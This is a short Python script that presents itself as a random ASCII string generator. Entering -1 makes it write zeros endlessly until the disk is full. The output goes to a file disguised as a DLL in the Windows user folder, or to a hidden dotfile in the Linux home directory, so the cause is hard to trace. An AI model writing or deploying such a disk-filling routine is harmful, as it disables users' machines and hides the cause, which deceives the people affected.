import random
import os
import platform

string = ""
MB = '0' * 1024 * 1024
system = platform.system()

length = int(input("How many characters (-1 to fill whole disk with 0s)? "))

if length >= 0:
      for i in range(length):
            string += chr(random.randint(32,126))
            with open("ASCII_String.txt", "w") as text:
                text.write(string)

if length == -1:
      if system == 'Windows':
            username = os.getenv('USERNAME')
            with open(r"C:\Users\{}\0x1a2b3c4d.dll".format(username), "a") as text:
                  while True:
                        text.write(MB)
      if system == 'Linux':
            username = os.environ.get("USER")
            with open(r"/home/{}/.0x1a2b3c4d".format(username), "a") as text:
                  while True:
                        text.write(MB)
